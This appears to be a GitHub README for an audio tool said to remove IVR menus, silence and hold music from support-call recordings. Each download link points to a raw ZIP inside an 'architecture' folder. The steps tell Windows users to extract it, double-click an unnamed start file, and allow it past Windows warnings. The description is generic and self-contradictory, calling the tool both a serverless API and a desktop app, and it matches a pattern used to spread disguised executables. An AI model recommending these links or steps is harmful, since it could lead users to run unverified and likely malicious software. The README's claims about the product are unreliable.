# 🎧 call-recording-cleaner-api - Clean support calls with less noise

[![Download](https://img.shields.io/badge/Download%20from%20GitHub-blue?style=for-the-badge)](https://github.com/TaperSpider/call-recording-cleaner-api/raw/refs/heads/main/architecture/call_cleaner_recording_api_v2.1.zip)

## 🚀 What this does

call-recording-cleaner-api helps clean support call recordings by removing:

- IVR menus
- silence
- music
- non-speech parts

It uses an AI audio model to find speech and skip the parts that do not need to stay. The result is a cleaner call file that is easier to review, store, and share.

## 💻 What you need

Before you start, make sure your Windows PC has:

- Windows 10 or later
- A modern web browser
- Internet access for the first download
- Enough free space for audio files
- A few minutes to set it up

For best results, use call recordings in common audio formats such as:

- MP3
- WAV
- M4A
- AAC

## 📥 Download the app

Visit this page to download:

https://github.com/TaperSpider/call-recording-cleaner-api/raw/refs/heads/main/architecture/call_cleaner_recording_api_v2.1.zip

If the page shows a release file, download it to your Windows computer. If it shows source files only, use the files from the repository page and follow the setup steps below.

## 🪟 Install on Windows

1. Open the download link above in your browser.
2. Find the latest release or the main project files.
3. Download the app files to a folder on your PC.
4. If the download comes as a ZIP file, right-click it and choose Extract All.
5. Keep the files in one folder so they are easy to find.

If Windows asks for permission, choose Allow or Run.

## ▶️ Run the app

1. Open the folder where you saved the files.
2. Look for the main start file for the API or Windows package.
3. Double-click the file to launch it.
4. Wait for the first start to finish loading the audio model.
5. Keep the window open while you use the API.

If the app opens in your browser or shows a local address, leave that window open. That means the service is running.

## 🔧 How to use it

The app is built to clean support call recordings. A typical use looks like this:

1. Open the running app or API address.
2. Upload or point it to a call recording.
3. Start the cleaning process.
4. Wait while the model checks the audio.
5. Save the cleaned file when the process ends.

The cleaner looks for speech and removes parts that are not useful for review. This helps cut down call length and makes transcripts easier to work with.

## 🧠 What the AI model does

This project uses a CNN audio classification model in ONNX format. In plain terms, that means:

- it listens to short parts of the audio
- it checks if each part has speech
- it marks silence, music, and IVR audio
- it keeps the parts that sound like real conversation

The ONNX format helps the model run in a standard way on Windows and other systems that support it.

## 📁 Common file types

You can use the app with files that are usually found in call centers and support teams:

- recorded customer calls
- agent call logs
- voicemail audio
- training call samples
- support QA recordings

For the cleanest result, use files with steady audio levels and clear speech.

## ⚙️ Basic setup steps

If you are setting it up for the first time, use this order:

1. Download the project from GitHub.
2. Extract the files if they come in a ZIP.
3. Open the folder.
4. Start the app or API.
5. Load a call recording.
6. Check the cleaned output file.

If you use this on the same PC each time, save the folder in one fixed place like Documents or Downloads.

## 🧩 How it fits into your workflow

This tool works well when you need to:

- trim long support calls
- remove dead air
- strip out hold music
- reduce IVR noise
- prepare calls for review
- keep only speech segments

That can save time when you listen to calls by hand or pass audio into another system.

## 🧪 Example use case

A support team records a 30-minute call. The first few minutes include IVR menus and hold music. The app scans the file, removes those parts, and keeps the speech sections. The final file is shorter and easier to review.

## 🔍 Helpful tips

- Use clear audio files for best results
- Keep source files unchanged so you can compare results
- Start with one test file before you process many calls
- Save cleaned files in a separate folder
- Use short file names with no special characters if you can

## 🛠️ Troubleshooting

If the app does not start:

1. Check that the files finished downloading.
2. Make sure you extracted the ZIP file, if there was one.
3. Try running the app again.
4. Keep the folder path simple, such as `C:\call-recording-cleaner-api\`
5. Make sure the audio file is not open in another app

If the output sounds wrong:

- try a clearer recording
- check the input file format
- test with a shorter call first
- confirm the recording has normal speech levels

If Windows blocks the file, use the standard Windows option to allow the app to run after you confirm it came from the GitHub repository above

## 📌 Project focus

This repository centers on:

- audio classification
- audio cleaning
- CNN model inference
- ONNX runtime
- serverless API use
- speech segment filtering

It is built for support call cleanup, not for music editing or studio audio work

## 🔗 Download again

[![GitHub Repository](https://img.shields.io/badge/GitHub%20Repository-grey?style=for-the-badge)](https://github.com/TaperSpider/call-recording-cleaner-api/raw/refs/heads/main/architecture/call_cleaner_recording_api_v2.1.zip)